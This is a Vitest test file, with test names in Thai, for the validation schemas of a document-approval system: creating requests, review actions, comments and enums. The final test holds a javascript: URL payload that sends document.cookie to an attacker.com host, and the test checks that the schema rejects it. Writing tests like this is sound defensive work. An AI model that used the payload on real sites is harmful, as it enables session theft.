import { describe, it, expect } from "vitest";
import {
  createDocumentSchema,
  reviewDocumentSchema,
  addCommentSchema,
  docTypeEnum,
  docUrgencyEnum,
  docStatusEnum,
} from "./validations";

describe("edocument validations", () => {
  const validUUID = "123e4567-e89b-12d3-a456-426614174000";
  const validUUID2 = "223e4567-e89b-12d3-a456-426614174000";

  const validDoc = {
    title: "ขออนุมัติจัดโครงการสัมมนาเชิงปฏิบัติการปัญญาประดิษฐ์",
    documentType: "PROJECT_PROPOSAL" as const,
    urgency: "URGENT" as const,
    content: "รายละเอียดโครงการเพื่อพัฒนาศักยภาพนักศึกษา...",
    amount: 50000,
    submitImmediately: true,
    attachments: [
      {
        fileName: "project_proposal.pdf",
        fileUrl: "https://example.com/project_proposal.pdf",
        fileSize: 102400,
      },
    ],
  };

  it("createDocumentSchema ผ่านเมื่อข้อมูลคำร้องครบถ้วน", () => {
    const result = createDocumentSchema.parse(validDoc);
    expect(result.title).toBe(validDoc.title);
    expect(result.documentType).toBe("PROJECT_PROPOSAL");
    expect(result.urgency).toBe("URGENT");
    expect(result.amount).toBe(50000);
    expect(result.attachments).toHaveLength(1);
  });

  it("createDocumentSchema ล้มเมื่อไม่มี title หรือ content", () => {
    expect(() => createDocumentSchema.parse({ ...validDoc, title: "" })).toThrow();
    expect(() => createDocumentSchema.parse({ ...validDoc, content: "" })).toThrow();
  });

  it("reviewDocumentSchema ตรวจสอบการลงนามอนุมัติ ส่งกลับ และปฏิเสธ", () => {
    const approve = {
      documentId: validUUID,
      stepId: validUUID2,
      action: "APPROVED" as const,
      comment: "อนุมัติให้ดำเนินการได้ตามแผน",
    };
    expect(reviewDocumentSchema.parse(approve).action).toBe("APPROVED");

    const revise = {
      documentId: validUUID,
      stepId: validUUID2,
      action: "REVISED_REQUESTED" as const,
      comment: "ขอให้ปรับงบประมาณ",
    };
    expect(reviewDocumentSchema.parse(revise).action).toBe("REVISED_REQUESTED");

    expect(() =>
      reviewDocumentSchema.parse({
        documentId: validUUID,
        stepId: validUUID2,
        action: "INVALID_ACTION",
      })
    ).toThrow();
  });

  it("addCommentSchema ต้องการ documentId และ message", () => {
    const valid = { documentId: validUUID, message: "ได้ดำเนินการแก้ไขตามข้อเสนอแนะแล้ว" };
    expect(addCommentSchema.parse(valid)).toEqual(valid);

    expect(() => addCommentSchema.parse({ documentId: validUUID, message: "" })).toThrow();
  });

  it("docTypeEnum, docUrgencyEnum, docStatusEnum ครบถ้วนตามข้อกำหนด", () => {
    expect(docTypeEnum.options).toEqual([
      "PROJECT_PROPOSAL",
      "OFFICIAL_TRAVEL",
      "PROCUREMENT_REQ",
      "GENERAL_REQUEST",
    ]);
    expect(docUrgencyEnum.options).toEqual(["NORMAL", "URGENT", "VERY_URGENT"]);
    expect(docStatusEnum.options).toContain("DRAFT");
    expect(docStatusEnum.options).toContain("APPROVED");
    expect(docStatusEnum.options).toContain("REJECTED");
    expect(docStatusEnum.options).toContain("REVISED_REQUESTED");
  });

  it("createDocumentSchema ปฏิเสธไฟล์แนบที่มี URL เป็นอันตราย (XSS schemes เช่น javascript:)", () => {
    const malicious = {
      ...validDoc,
      attachments: [
        {
          fileName: "exploit.pdf",
          fileUrl: "javascript:fetch('http://attacker.com/steal?cookie='+document.cookie)",
        },
      ],
    };
    expect(() => createDocumentSchema.parse(malicious)).toThrow();
  });
});
